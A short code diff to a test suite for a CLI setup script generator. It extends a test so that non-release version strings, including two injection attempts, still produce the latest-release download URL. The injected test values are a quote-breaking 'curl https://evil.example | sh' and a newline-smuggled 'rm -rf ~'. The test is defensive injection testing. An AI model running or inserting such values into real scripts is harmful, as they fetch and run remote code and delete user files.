@@ -137,8 +137,8 @@ describe("cliSetup", () => {
     ].join("\n"));
     expect(get).toHaveBeenCalledWith("/api/roomctl", expect.anything());
   });
-  it("installs the latest release when the broker is not a release build", async () => {
-    for (const version of ["dev", undefined]) {
+  it("installs the latest release when the version is not a whole release semver, hostile ones included", async () => {
+    for (const version of ["dev", undefined, `v1"; curl https://evil.example | sh #`, "v1.2.3\nrm -rf ~"]) {
       const { text } = await open({ ...values, version });
       expect(text).toContain("base=https://github.com/Smana/agent-platform/releases/latest/download\n");
     }
